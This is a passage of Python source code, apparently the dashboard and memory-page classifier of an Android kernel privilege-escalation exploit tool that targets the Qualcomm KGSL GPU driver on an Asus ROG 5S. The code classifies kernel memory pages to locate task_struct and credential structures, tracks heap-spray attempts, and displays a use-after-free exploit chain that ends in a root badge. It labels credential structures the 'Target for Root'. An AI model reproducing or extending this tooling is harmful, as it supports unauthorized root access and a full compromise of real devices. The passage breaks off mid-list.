    # ============== KNOWLEDGE BASE ==============
    def load_kb(self):
        if os.path.exists(self.kb_path):
            try:
                with open(self.kb_path, 'r') as f:
                    return json.load(f)
            except Exception:
                pass
        return {"successful_vas": [], "hit_count": 0, "ranges": []}

    def save_kb(self):
        with open(self.kb_path, 'w') as f:
            json.dump(self.knowledge_base, f, indent=4)

    # ============== LOGGING ==============
    def log_event(self, event_type, data):
        """Append event to global JSONL log. Called by spray + scan + patch."""
        entry = {
            "ts": datetime.datetime.now().isoformat(),
            "type": event_type,
            **data,
        }
        try:
            with open(self.log_path, 'a') as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            pass
        # mirror short events in spray_log
        if event_type in ("spray", "kill", "scan_match", "patch"):
            self.spray_log.append(entry)

    # ============== AI CLASSIFIER ==============
    def classify_page(self, page_data, va, sig=0, off_in_page=-1):
        """Classify a found memory page. sig comes from the C engine
        (1=task_struct with KETO0422, 2=system app, 3=kernel ELF, 4=init_cred,
         6=cred pointer, 7=Linux version banner, 8=kernel text/data marker,
         9=root-cred heap pattern). 100% when sig>0. SELinux is no longer
        found by random scan — it must be probed via _probe_selinux
        (known offset)."""
        # 1. task_struct with KETO0422 comm (from spray) — this is 100% a task_struct
        if sig == 1:
            cred_va = va + (self.cred_offset - off_in_page)
            return {
                "type": "Privilege Struct",
                "description": f"task_struct (KETO0422 comm @ 0x{off_in_page:x}) — cred @ {cred_va:#x}",
                "va": hex(va),
                "confidence": 100,
                "data": page_data,
            }
        # 2. system app string — 100% it's a system app
        if sig == 2:
            name = b"com.android."
            idx = page_data.find(name)
            app = page_data[idx:idx+64].split(b"\x00")[0].decode(errors="ignore") if idx >= 0 else "?"
            return {"type": "System App", "description": app, "va": hex(va),
                    "confidence": 100, "data": page_data}
        # 3. kernel ELF — 100% it's the kernel base
        if sig == 3:
            return {"type": "Kernel Code", "description": "Kernel ELF header (100% kernel base)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 4. init_cred string — 100% init_cred struct
        if sig == 4:
            return {"type": "Privilege Struct", "description": "init_cred (100% cred)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 6. cred pointer — 100% it's a task_struct cred field
        if sig == 6:
            cred_va = va + off_in_page
            return {"type": "Privilege Struct",
                    "description": f"cred pointer @ 0x{off_in_page:x} (100% task_struct.cred)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 7. Linux version banner — 100% it's kernel text/.rodata
        if sig == 7:
            tail = page_data[off_in_page:off_in_page + 64].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Kernel Code",
                    "description": f"Linux banner: {tail[:50]}",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # 8. Kernel text/data marker — 95% it's a kernel symbol
        if sig == 8:
            tail = page_data[off_in_page:off_in_page + 32].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Kernel Code",
                    "description": f"Kernel marker: '{tail}' @ 0x{off_in_page:x}",
                    "va": hex(va), "confidence": 95, "data": page_data}
        # 9. Root-cred heap pattern — 90% it's init_cred / a cred with uid=0
        if sig == 9:
            return {"type": "Privilege Struct",
                    "description": "Root cred (usage=1, uid/gid=0, kptr in field)",
                    "va": hex(va), "confidence": 90, "data": page_data}
        # 10. Real Linux kernel comm string (swapper/0, kthreadd, init, kworker, …)
        #     This is a strong task_struct indicator (without our spray marker).
        if sig == 10:
            tail = page_data[off_in_page:off_in_page + 16].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Task Struct",
                    "description": f"Real kernel comm '{tail}' @ 0x{off_in_page:x} (task_struct on 5.4)",
                    "va": hex(va), "confidence": 95, "data": page_data}
        # 11. Dense kernel heap page (>= 8 kernel pointers, >= 30% non-zero).
        #     Strong indicator of an active kernel slab object (cred, task_struct,
        #     file, inode, …). Classify as "Kernel Heap Object" with the offset
        #     info so the user can drill in.
        if sig == 11:
            return {"type": "Kernel Heap",
                    "description": "Dense kernel heap page (>= 8 kernel VAs, 30%+ non-zero)",
                    "va": hex(va), "confidence": 75, "data": page_data}
        # 12. Sparse kernel heap page (>= 3 kernel pointers, >= 16% non-zero).
        #     Could be a kallsyms entry, /sys data, a sparse slab object.
        if sig == 12:
            return {"type": "Kernel Heap",
                    "description": "Sparse kernel data (>= 3 kernel VAs, 16%+ non-zero)",
                    "va": hex(va), "confidence": 55, "data": page_data}
        # 13. task_struct detected by task_struct.stack (kernel ptr at
        #     0x30) + __state (u32<0x100) + usage (u32 1..0xffff) layout
        #     on Linux 5.4. This is one of the strongest indicators
        #     that the page is a real task_struct — we don't need our
        #     spray marker to match.
        if sig == 13:
            return {"type": "Task Struct",
                    "description": (f"task_struct layout @ 0x{off_in_page:x} "
                                    f"(stack+state+usage) on 5.4"),
                    "va": hex(va), "confidence": 88, "data": page_data}
        # 14. task_struct with a cred pointer at 0x6a0/0x768/0x770/0x7c0
        #     that points into plausible kmalloc range + a comm-ish
        #     ASCII run somewhere in the page. This means we can walk
        #     the cred chain from this struct directly.
        if sig == 14:
            return {"type": "Task Struct",
                    "description": (f"task_struct with cred ptr @ "
                                    f"0x{off_in_page:x} on 5.4"),
                    "va": hex(va), "confidence": 92, "data": page_data}
        # 15. Process state page — has u32 in {0,1,4,8,16,32,64} +
        #     plausible pid in next 0x80 bytes (>= 2 hits). Could be
        #     a process info page or a wait-queue.
        if sig == 15:
            return {"type": "Process State",
                    "description": (f"Process state @ 0x{off_in_page:x} "
                                    f"(2+ state+pid pairs)"),
                    "va": hex(va), "confidence": 60, "data": page_data}
        # 17. Generic comm-like field (4-7 ASCII bytes + 4+ NULs in next
        #     12). Catches arbitrary process comms, including our spray
        #     processes whose prctl-set name is in KGSL range. Lower
        #     confidence because we don't have a known comm to compare
        #     against, but still a strong task_struct indicator.
        if sig == 17:
            tail = page_data[off_in_page:off_in_page + 16].split(b"\x00")[0]
            tail = tail.decode(errors="ignore")
            return {"type": "Task Struct",
                    "description": (f"comm-like field '{tail}' @ 0x{off_in_page:x} "
                                    f"(16-byte comm + NUL pad)"),
                    "va": hex(va), "confidence": 75, "data": page_data}

        # Fallback heuristic classification (no sig from engine)
        # NOTE: no SELinux here — SELinux only via _probe_selinux (known offset)
        idx = page_data.find(b"KETO0422")
        if idx >= 0:
            # If we got a task_struct without sig (shouldn't happen), still mark 100%
            cred_va = va + (self.cred_offset - idx) if idx >= 0 else 0
            return {"type": "Privilege Struct",
                    "description": f"task_struct (KETO0422) cred @ {cred_va:#x}",
                    "va": hex(va), "confidence": 100, "data": page_data}
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                return {"type": "System App", "description": name, "va": hex(va),
                        "confidence": 80, "data": page_data}
        for sig_b, name in self.kernel_structures.items():
            if sig_b in page_data:
                if hex(va) not in self.knowledge_base["successful_vas"]:
                    self.knowledge_base["successful_vas"].append(hex(va))
                    self.knowledge_base["hit_count"] += 1
                    self.save_kb()
                return {"type": "Kernel Core", "description": name, "va": hex(va),
                        "confidence": 70, "data": page_data}
        uid_pattern = struct.pack("<IIII", 10237, 10237, 10237, 10237)
        if uid_pattern in page_data:
            return {"type": "Privilege Struct", "description": "CRED for UID 10237",
                    "va": hex(va), "confidence": 60, "data": page_data}
        sys_uid = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if sys_uid in page_data:
            return {"type": "Privilege Struct", "description": "System UID (1000)",
                    "va": hex(va), "confidence": 60, "data": page_data}
        if b"\x00\x00\x00\x94" in page_data:
            return {"type": "Kernel Code", "description": "Executable AArch64 Segment",
                    "va": hex(va), "confidence": 60, "data": page_data}
        # Permissive fallback: use _is_page_interesting so we get a useful
        # description/confidence instead of a generic "Unclassified Data Fragment"
        interesting, reason, conf = self._is_page_interesting(page_data)
        if interesting:
            return {"type": "Unknown Object",
                    "description": f"Auto-classified ({reason})",
                    "va": hex(va), "confidence": conf, "data": page_data}

        # === EXTENDED FALLBACK HEURISTICS ===
        # The code below catches pages that didn't match any of the
        # explicit sigs (1-17) and didn't pass _is_page_interesting.
        # We try a wider set of patterns so the user sees meaningful
        # types in the File Manager instead of "Unclassified".
        # Kernel comm strings (Linux 5.4 default set)
        kernel_comms = (
            b"swapper/", b"kthreadd\x00", b"init\x00", b"kworker/",
            b"migration/", b"ksoftirqd/", b"rcu_", b"kdevtmpfs",
            b"oom_reaper", b"writeback", b"kcompactd", b"crypto",
            b"watchdog/", b"cpuhp/", b"kblockd", b"systemd",
            b"kswapd", b"kthrotld", b"irq/", b"scsi_", b"xfs",
            b"ipv6_addrconf", b"kworker",
        )
        for kc in kernel_comms:
            if kc in page_data:
                idx = page_data.find(kc)
                tail = page_data[idx:idx+16].split(b"\x00")[0].decode(errors="ignore")
                return {"type": "Task Struct",
                        "description": (f"kernel comm '{tail}' @ 0x{idx:x}"),
                        "va": hex(va), "confidence": 80, "data": page_data}
        # Any KETO* / KETW* pattern (4-7 byte ASCII + NUL pad) anywhere
        for marker in (b"KETO", b"KETW"):
            idx = page_data.find(marker)
            if idx >= 0:
                tail = page_data[idx:idx+8].split(b"\x00")[0].decode(errors="ignore")
                return {"type": "Spray Marker",
                        "description": (f"spray comm '{tail}' @ 0x{idx:x}"),
                        "va": hex(va), "confidence": 85, "data": page_data}
        # KGSL/ioctl strings (kernel driver-specific memory)
        for kgsl_str in (b"kgsl-3d0", b"adreno", b"msm_gpu", b"kgsl",
                         b"i915", b"drm", b"mali", b"pvr"):
            if kgsl_str in page_data:
                idx = page_data.find(kgsl_str)
                return {"type": "Kernel Driver",
                        "description": (f"GPU/KGSL string '{kgsl_str.decode()}' @ 0x{idx:x}"),
                        "va": hex(va), "confidence": 70, "data": page_data}
        # High kernel pointer density (>= 5 kptrs, > 30% non-zero)
        kptrs = 0
        nz = 0
        for qi in range(0, 4096, 8):
            qv = struct.unpack("<Q", page_data[qi:qi+8])[0]
            if qv: nz += 1
            if (qv >> 32) >= 0xffffff80 and (qv >> 40) <= 0xffffffcf and qv:
                kptrs += 1
        if kptrs >= 5 and nz > 1200:
            return {"type": "Kernel Heap",
                    "description": f"dense kernel heap ({kptrs} kptrs, {nz*8/4096*100:.0f}% nz)",
                    "va": hex(va), "confidence": 65, "data": page_data}
        if kptrs >= 3:
            return {"type": "Kernel Heap",
                    "description": f"kernel heap ({kptrs} kptrs, {nz*8/4096*100:.0f}% nz)",
                    "va": hex(va), "confidence": 50, "data": page_data}
        # ELF magic (kernel .text segment)
        if page_data[:4] == b"\x7fELF":
            return {"type": "Kernel Code",
                    "description": "ELF header (kernel .text)",
                    "va": hex(va), "confidence": 100, "data": page_data}
        # If page is fully zero, mark as such
        if nz == 0:
            return {"type": "Empty Page",
                    "description": "all-zero (unallocated)",
                    "va": hex(va), "confidence": 0, "data": page_data}
        return {"type": "Unknown Object",
                "description": f"Unclassified (kptrs={kptrs} nz={nz*8/4096*100:.0f}%)",
                "va": hex(va), "confidence": 10, "data": page_data}

    def translate_logic(self, item):
        data = item['data']
        desc = item['description']
        if "task_struct" in desc or b"KETO" in data:
            try:
                pid = struct.unpack("<I", data[self.offsets["pid"]:self.offsets["pid"]+4])[0]
                comm = data[self.offsets["comm"]:self.offsets["comm"]+16].split(b"\x00")[0].decode(errors='ignore')
            except Exception:
                pid, comm = 0, "unknown"
            return f"Process Descriptor for '{comm}' (PID {pid})"
        if "SELinux" in desc:
            return "Global SELinux configuration bit."
        if "Settings" in desc:
            return "Android Settings process memory."
        if "CRED" in desc:
            return "Credential structure. Holds UID/GID. Target for Root."
        return "Generic data buffer."

    # ============== LIVE UPDATER ==============
    def _live_updater(self):
        last_spray_count = 0
        last_t = time.time()
        while not self._stop_live.is_set():
            now = time.time()
            self.live["ram"] = self.get_ram_usage()
            self.live["ai_patterns"] = self.knowledge_base.get("hit_count", 0)

            # Status reflects engine + per-op busy state
            if self.autopilot_mode and self.autopilot_thread and self.autopilot_thread.is_alive():
                if self.autopilot_paused:
                    self.live["status"] = "AUTOPILOT ⏸"
                else:
                    self.live["status"] = "AUTOPILOT"
            elif self.op_busy.get("exploit"):
                self.live["status"] = "EXPLOITING…"
            elif self.op_busy.get("scan"):
                self.live["status"] = "SCANNING…"
            elif self.exploit_proc and self.exploit_proc.poll() is None:
                self.live["status"] = "EXPLOIT ACTIVE"
                self.live["engine_pid"] = self.exploit_proc.pid
            else:
                self.live["status"] = "IDLE"
                self.live["engine_pid"] = 0

            # Particle index for animation
            self.live["particle_idx"] = (self.live["particle_idx"] + 1) % len(PARTICLES)
            # Spray pulse: rate of sprays per second
            if self.live["spray_count"] != last_spray_count:
                dt = max(0.001, now - last_t)
                self.live["sprays_per_sec"] = (self.live["spray_count"] - last_spray_count) / dt
                last_spray_count = self.live["spray_count"]
                self.live["last_spray_ts"] = now
                self.live["spray_pulse"] = (self.live["spray_pulse"] + 1) % len(SPRAY_PARTICLES)
                last_t = now

            time.sleep(0.2)

    # ============== AUTO RENDERER ==============
    # NOTE: The actual render thread is _render_loop() / _start_render_thread()
    # defined near the top of the class (around line 729). It is the
    # SOLE render thread. We do NOT start the older _auto_renderer()
    # here anymore — that one was conflicting with the new one and
    # causing deadlocks on the render_lock.
    # The _live_updater() below ONLY updates the live{} dict; the
    # render thread is what paints the screen.

    # ============== TUI ==============
    # All TUI writes go through sys.stdout.write + flush. We use
    # ONE thread (the main thread) for both input and rendering,
    # so no locks are needed. select() in input_cmd() drives the
    # auto-redraw at ~3 Hz (every 0.3s of no keypress).
    def render_tui(self, hint=""):
        """Public entry point. Build the TUI with the prompt included
        and write it atomically. Delegates to _render_tui_body for
        the body lines and appends the prompt on its own line.
        """
        # v4.1: update throughput history at 1Hz (no-op if not yet
        # 1s since last update)
        self._update_throughput()
        if not self.render_lock.acquire(blocking=False):
            return
        try:
            sys.stdout.write("\033[?25l")  # hide cursor
            sys.stdout.write(C.CLR)          # clear + home
            self._render_tui_body(hint=hint)
            # Trailing prompt line. End with \r\n so the cursor
            # drops to a fresh line below the prompt.
            sys.stdout.write(f"\r\n {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} ")
            sys.stdout.flush()
            sys.stdout.write("\033[?25h")   # show cursor
            sys.stdout.flush()
        except Exception:
            pass
        finally:
            try:
                sys.stdout.write("\033[?25h")
                sys.stdout.flush()
            except Exception:
                pass
            self.render_lock.release()

    def _bar(self, pct, width, color):
        filled = int(width * pct / 100)
        return f"{C.GRY}[{color}{'█' * filled}{'░' * (width - filled)}{C.GRY}]{C.RST}"

    # ============== INPUT + AUTO-REDRAW (single-thread, Termux-safe) ==============
    # Canonical TUI pattern for Termux/Android:
    #   - ONE thread (the main thread) owns ALL stdout writes.
    #   - `select()` with a short timeout (0.3s) lets the loop
    #     auto-redraw the TUI when no key is pressed. So the user
    #     sees live updates (RAM, AI, spray, scan, particles)
    #     without pressing anything.
    #   - `tty.setcbreak` (NOT setraw): char-by-char input but
    #     OPOST stays ON so \n → \r\n translation still works
    #     (with setraw, every TUI redraw becomes a "staircase"
    #     of indented lines and you only see the first frame).
    #   - `sys.stdout.write` + `flush` (no `print`, no `os.write`,
    #     no second thread) — the most portable and reliable path
    #     on every Termux build.
    def input_cmd(self):
        self.is_reading_input = True
        try:
            # Initial TUI render so the user sees the dashboard on
            # the very first input prompt. Without this they'd only
            # see "explorer >" with a blank screen above.
            # v4.1.25: also print the static buttons in the
            # bottom region ONCE. Subsequent TUI redraws
            # never touch the bottom region.
            if not self._static_bottom_printed:
                try:
                    self._render_static_bottom()
                except Exception:
                    pass
                self._static_bottom_printed = True
            try:
                self._tui_full_redraw_with_input("")
            except Exception:
                pass
            self._print_prompt("")
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setcbreak(fd)
                buf = []
                hist_idx = len(self.cmd_history)
                last_redraw = 0.0
                REDRAW_EVERY = 0.3  # seconds
                while True:
                    r, _, _ = select.select([fd], [], [], REDRAW_EVERY)
                    now = time.time()
                    if not r:
                        # No key pressed in the timeout window →
                        # auto-redraw the WHOLE TUI so live values
                        # update online without user input.
                        if now - last_redraw >= REDRAW_EVERY:
                            self._tui_full_redraw_with_input("".join(buf))
                            last_redraw = now
                        continue
                    ch = os.read(fd, 1)
                    if not ch:
                        break
                    c = ch.decode("utf-8", errors="ignore")
                    if c == "\x03":  # Ctrl+C
                        buf = ["q"]
                        break
                    if c == "\x10":  # Ctrl+P  -> cancel learning
                        self.cmd_learning_cancel()
                        self.live["last_msg"] = "Press 'L' to start a new learning cycle."
                        self._print_prompt("".join(buf), extra="\n [Ctrl+P] Learning cancelled.\n")
                        continue
                    if c in ("\r", "\n"):
                        sys.stdout.write("\r\n")
                        sys.stdout.flush()
                        break
                    if c == "\x7f" or c == "\b":
                        if buf:
                            buf.pop()
                            sys.stdout.write("\b \b")
                            sys.stdout.flush()
                        continue
                    if c == "\x05":  # Ctrl+E -> rewind to last command
                        if self.last_cmd_text:
                            self._print_prompt(self.last_cmd_text)
                            buf = list(self.last_cmd_text)
                        continue
                    if c == "\x1b":  # ESC sequence (arrow keys)
                        nxt = os.read(fd, 2)
                        if nxt == b"[A":  # Up arrow
                            if self.cmd_history and hist_idx > 0:
                                hist_idx -= 1
                                self._print_prompt(self.cmd_history[hist_idx])
                                buf = list(self.cmd_history[hist_idx])
                        elif nxt == b"[B":  # Down arrow
                            if self.cmd_history and hist_idx < len(self.cmd_history) - 1:
                                hist_idx += 1
                                self._print_prompt(self.cmd_history[hist_idx])
                                buf = list(self.cmd_history[hist_idx])
                            else:
                                hist_idx = len(self.cmd_history)
                                self._print_prompt("")
                                buf = []
                        continue
                    buf.append(c)
                    sys.stdout.write(c)
                    sys.stdout.flush()
                    # Any keypress also triggers a redraw so the
                    # TUI stays fresh even when the user is typing
                    # quickly (otherwise 0.3s of burst typing could
                    # miss the auto-redraw window).
                    if now - last_redraw >= REDRAW_EVERY:
                        self._tui_full_redraw_with_input("".join(buf))
                        last_redraw = now
            finally:
                try:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old)
                except Exception:
                    pass
            cmd = "".join(buf).strip()
            if cmd:
                self.cmd_history.append(cmd)
                if len(self.cmd_history) > 100:
                    self.cmd_history = self.cmd_history[-100:]
                self.last_cmd_text = cmd
            return cmd
        finally:
            self.is_reading_input = False

    def _print_prompt(self, buf, extra=""):
        """Print the prompt + buffer on the current line.
        NO trailing \\n — the user types on the same line. This is
        critical for Termux: if we put \\n at the end, the cursor
        drops to the next line and the user's chars end up on a
        line that gets cleared on the next TUI redraw.
        """
        # \r = go to col 0; \033[2K = clear entire line.
        # Then the prompt + buffer. No \n after — the user
        # types after the buffer, on the same line.
        line = f"\r\033[2K{extra} {C.BOLD}{C.GRN}explorer{C.RST} {C.GRY}>{C.RST} {buf}"
        sys.stdout.write(line)
        sys.stdout.flush()

    def _render_static_bottom(self):
        """v4.1.25: print buttons + prompt separator in the
        bottom region. This is called ONCE on startup. The
        TUI redraws never touch the bottom region.
        The bottom region is positioned below the TUI
        body. We position the cursor at the bottom of
        the screen and print the buttons + prompt
        there.

        Layout:
          - TUI body: lines 1-22 (status, perf, etc.)
          - separator: line 23
          - buttons: lines 24-27 (4 lines)
          - separator: line 28
          - LIVE LOG: lines 29-32 (header + 3 log lines)
          - separator: line 33
          - prompt: line 34
        """
        # First, position cursor at row 22 (the TUI body is
        # up to 22 lines).
        sys.stdout.write("\033[22;1H")
        # Print buttons (4 lines, lines 22-25)
        sys.stdout.write(
            f"{C.GRY}{'─'*92}{C.RST}\n")
        sys.stdout.write(
            f" {C.GRN}[A]{C.RST} AUTOPILOT       "
            f" {C.GRN}[P]{C.RST} Pause           "
            f" {C.GRN}[G]{C.RST} Resume          "
            f" {C.RED}[X]{C.RST} Stop\n")
        sys.stdout.write(
            f" {C.BLU}[R]{C.RST} Verify Root       "
            f" {C.BLU}[B]{C.RST} Rebuild Engine    "
            f" {C.BLU}[Q]{C.RST} Exit Explorer     "
            f" {C.BLU}[ID]{C.RST} Open File\n")
        sys.stdout.write(
            f" {C.BLU}[list]{C.RST} Show All Items "
            f" {C.BLU}[kb]{C.RST} Kernel Intel   "
            f" {C.BLU}[log]{C.RST} Spray Log\n")
        sys.stdout.write(
            f" {C.BLU}[stats]{C.RST} AI Stats    "
            f" {C.BLU}[save]{C.RST} Export JSON  "
            f" {C.BLU}[dev]{C.RST} Device Info\n")
        sys.stdout.write(
            f" {C.BLU}[v<N>]{C.RST} Re-verify    "
            f" {C.BLU}[walk]{C.RST} Cred chain   "
            f" {C.BLU}[w3]{C.RST} Deep-scan   "
            f" {C.BLU}[rva]{C.RST} Read VA  "
            f" {C.BLU}[health]{C.RST} Health   "
            f" {C.BLU}[englog]{C.RST} Engine Stderr\n")
        sys.stdout.write(
            f" {C.BLU}[tstack]{C.RST} Task Stacks   "
            f" {C.BLU}[vcomm]{C.RST} Verify Comm   "
            f" {C.BLU}[kb]{C.RST} Kernel Base\n")
        sys.stdout.write(
            f"{C.GRY}{'─'*92}{C.RST}\n")
        sys.stdout.flush()

    def _tui_full_redraw_with_input(self, input_buf):
        """Atomically redraw the TUI body without touching
        the bottom region (buttons + prompt).

        v4.1.25 BOTTOM-LOCK: the user complained that
        buttons and prompt "disappear for 0.001s and
        come back" during TUI redraws. The reason was
        that the TUI body contained the buttons, so
        every clear-and-redraw destroyed and re-emitted
        them. We now:
          1. Print buttons ONCE on startup, into the
             bottom region (rows 22+).
          2. Each TUI redraw: clear only rows 1-22
             (the TUI body region), then print the
             live body, then leave the bottom alone.
          3. The user's typing buffer is re-emitted on
             the last line of the TUI body
             (overwriting the LIVE LOG STREAM area).

        The user can now see the buttons and prompt
        permanently and type commands without them
        flickering.
        """
        if not self.render_lock.acquire(blocking=False):
            return  # another render in progress; skip this frame
        try:
            # Hide cursor during redraw to avoid flicker
            sys.stdout.write("\033[?25l")
            # Cursor to top-left
            sys.stdout.write("\033[H")
            # Clear from cursor down to row 21 (we reserve
            # rows 22+ for the static bottom region).
            sys.stdout.write("\033[1;21H\033[J")
            try:
                self._render_tui_body()    # build & write body lines
            except Exception:
                pass
            # Re-emit the prompt + buffer at the BOTTOM of
            # the body region (row 21 or so, just above
            # the static buttons which start at row 22).
            # The user types here, and the TUI body
            # redraws above this line. The buttons
            # below stay put.
            sys.stdout.write("\033[21;1H\033[2K")
            self._print_prompt(input_buf)
            # Re-show cursor
            sys.stdout.write("\033[?25h")
            sys.stdout.flush()
        except Exception:
            pass
        finally:
            try:
                sys.stdout.write("\033[?25h")
                sys.stdout.flush()
            except Exception:
                pass
            self.render_lock.release()

    def _render_tui_body(self, hint=""):
        """Build the TUI lines (everything EXCEPT the prompt at the
        bottom) and write them to stdout with explicit \\r\\n
        endings. NO trailing \\r\\n — the caller adds the prompt
        on the same line as the cursor.
        """
        out = []
        L = self.live
        if "particle_idx" not in L:
            L["particle_idx"] = 0
        if "spray_pulse" not in L:
            L["spray_pulse"] = 0
        L["particle_idx"] += 1
        L["spray_pulse"]   = L["particle_idx"] // 2
        pi = L["particle_idx"] % len(PARTICLES)
        sp = L["spray_pulse"] % len(SPRAY_PARTICLES)
        particle = PARTICLES[pi]
        spray_p  = SPRAY_PARTICLES[sp]
        up = int(time.time() - L["uptime_start"])
        m, s = divmod(up, 60)
        h, m = divmod(m, 60)

        # Watchdog counter — shows how many times the watchdog
        # restarted something. If the user sees "restarts=N" growing,
        # the workers are crashing repeatedly and the auto-restart is
        # saving them.
        wd = L.get("watchdog_restarts") or {}
        wd_total = sum(wd.values()) if isinstance(wd, dict) else 0
        wd_str = f" WD={C.YEL}{wd_total}{C.RST}" if wd_total > 0 else ""

        # v4.1: Big "ROOT" badge in header when we have euid=0.
        # This is the most visible signal that the exploit succeeded.
        try:
            _euid_now = os.geteuid()
        except Exception:
            _euid_now = -1
        if _euid_now == 0:
            root_badge = f"  {C.BG_GRN}{C.WHT}{C.BOLD} ★ ROOT ★ {C.RST}"
        else:
            root_badge = ""

        out.append(f"{C.BG_BLK}{C.CYN}{C.BOLD} {particle} KGSL AI MEMORY EXPLORER  v4.1 Q-LEARN{C.RST}"
                   f"{C.GRY} │ {C.WHT}Asus ROG 5S  {C.GRY}│{C.RST}"
                   f" Up {C.GRN}{h:02d}:{m:02d}:{s:02d}{C.RST}  {C.GRY}│{C.RST}  "
                   f"{C.MAG}{spray_p}{C.RST}  {C.GRY}│{C.RST}"
                   f" {C.GRN}AUTO{C.RST}{wd_str}"
                   f"{root_badge}")

        ram_color = C.GRN if L["ram"] < 50 else (C.YEL if L["ram"] < 75 else C.RED)
        st_color  = C.GRN if "ACTIVE" in L["status"] else C.GRY
        out.append(f" {C.BOLD}STATUS{C.RST}: {st_color}{L['status']:<14}{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}RAM{C.RST}: {ram_color}{L['ram']:5.1f}%{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}AI LEARNING{C.RST}: {C.MAG}{L['ai_patterns']:>4}{C.RST} patterns"
                   f" {C.GRY}│{C.RST} {C.BOLD}ENGINE{C.RST}: {C.CYN}{L['engine_pid']:>6}{C.RST}"
                   f" {C.GRY}│{C.RST} {C.BOLD}SPRAY/s{C.RST}: {C.YEL}{L['sprays_per_sec']:5.1f}{C.RST}")
        # v4.1: visible build tag so user can verify they
        # have the latest code (e.g. "v4.1.7-debug-log").
        # If you see v4.1 with NO suffix, you are running
        # the old copy and need to sync.
        out.append(f" {C.DIM}BUILD: {_BUILD_TAG}{C.RST}")

        out.append(f" {C.BOLD}LAST MSG{C.RST}: {C.YEL}{L['last_msg'][:70]}{C.RST}")

        # v4.1.7: SELinux + KGSL diagnostic line. Shows the
        # current context and KGSL device visibility. The
        # last entry of self._kgsl_trace is the most
        # recent action taken, so the user can see exactly
        # what step the KGSL open is at (or where it
        # failed). v6.c has the same gating — the C
        # exploit must run in init/hal_graphics context
        # to actually open KGSL for ioctl (vs read).
        try:
            ctx_short = (self._selinux_ctx or "?")[-50:]
            kp = self._kptr_restricted
            if self.kgsl_fd is not None:
                kgsl_d = C.GRN + self.kgsl_path
            else:
                # Show the last 3 trace entries so the
                # user can see EXACTLY what step failed.
                trace = getattr(self, "_kgsl_trace", [])
                if trace:
                    last = " | ".join(trace[-3:])
                    kgsl_d = C.RED + last[:100]
                else:
                    kgsl_d = C.RED + "OFF (no trace)"
            out.append(f" {C.BOLD}CTX{C.RST}: {C.CYN}{ctx_short}{C.RST}"
                       f" {C.GRY}│{C.RST} kptr={C.YEL}{kp}{C.RST}"
                       f" {C.GRY}│{C.RST} KGSL: {kgsl_d}{C.RST}")
        except Exception:
            pass

        # === v4.1: PERF COUNTERS ===
        # Show real throughput (pages scanned, MB read, peaks)
        # not just counters. The user can see if the engine is
        # actually reading pages at full speed or stuck.
        perf = self.perf
        mb_read = perf.get("bytes_read", 0) / (1024 * 1024)
        scans = perf.get("scans_completed", 0)
        err_scans = perf.get("scans_failed", 0)
        # Highlight failed scans in red if they dominate
        err_col = C.RED if err_scans > scans * 0.5 else C.GRY
        out.append(
            f" {C.BOLD}PERF{C.RST}: "
            f"pages={C.CYN}{perf.get('pages_scanned', 0)}{C.RST} "
            f"MB={C.CYN}{mb_read:.1f}{C.RST} "
            f"sprayP={C.CYN}{perf.get('spray_attempts', 0)}{C.RST} "
            f"alivePk={C.YEL}{perf.get('spray_alive_peak', 0)}{C.RST} "
            f"scans={C.CYN}{scans}{C.RST} "
            f"err={err_col}{err_scans}{C.RST}")

        # === v4.1: SPRAY METHODS STATS ===
        # Side-by-side: which spray method is working?
        sms = self.spray_methods_stats
        m_parts = []
        for mn, st in sms.items():
            if st.get("attempts", 0) > 0:
                alive_pct = 100.0 * st.get("alive", 0) / st["attempts"]
                m_parts.append(f"{mn}:{st['attempts']}({alive_pct:.0f}%a)")
        if m_parts:
            out.append(f" {C.BOLD}METHODS{C.RST}: " +
                       f"{C.GRY}{' '.join(m_parts)}{C.RST}")

        # === v4.1: CONFIDENCE HISTOGRAM ===
        # Bar chart of confidence distribution
        if sum(self.conf_histogram) > 0:
            hist = self.conf_histogram
            total = sum(hist)
            out.append(f" {C.BOLD}CONF{C.RST}: ")
            for i, count in enumerate(hist):
                if count > 0:
                    lo = i * 10
                    hi = lo + 9 if i < 10 else 100
                    pct = 100.0 * count / total
                    bar_len = int(pct / 5)  # 1 char per 5%
                    bar = "█" * bar_len
                    col = C.RED if i < 3 else (C.YEL if i < 6 else C.GRN)
                    out.append(f"   {col}{lo:3d}-{hi:3d}:{C.RST} "
                               f"{col}{bar}{C.RST} {count} ({pct:.0f}%)")

        # === v4.1: THROUGHPUT SPARKLINE ===
        # Render the last 60 seconds of pages/sec as ASCII bars
        spark_chars = " ▁▂▃▄▅▆▇█"
        th = self.throughput_history
        if any(th):
            max_th = max(th) or 1.0
            bars = "".join(spark_chars[min(8, int((v / max_th) * 8))]
                           for v in th)
            avg_th = sum(th) / len([v for v in th if v > 0] or [1])
            m_per_hour = self.perf.get("matches_per_hour", 0)
            out.append(f" {C.BOLD}THRPT{C.RST}  "
                       f"peak={C.YEL}{max_th:.1f}{C.RST}pg/s "
                       f"avg={C.CYN}{avg_th:.1f}{C.RST}pg/s "
                       f"m/h={C.GRN}{m_per_hour}{C.RST}  "
                       f"{C.BLU}{bars}{C.RST}")

        # === v4.1: EXPLOIT CHAIN VISUALIZATION ===
        # Show the privilege-escalation chain step-by-step.
        # Each step is a checkbox that turns green when done.
        # This is the most important part of v4.1 — the user
        # sees what's happening in the exploit at all times.
        ec = self.exploit_chain
        try:
            euid_now = os.geteuid()
        except Exception:
            euid_now = -1
        root_col = C.GRN if ec.get("root_achieved", False) else C.GRY
        chain_steps = [
            ("trigger",  ec.get("uaf_triggered", False), "UAF trigger"),
            ("spray",    ec.get("spray_objects", 0) > 0,
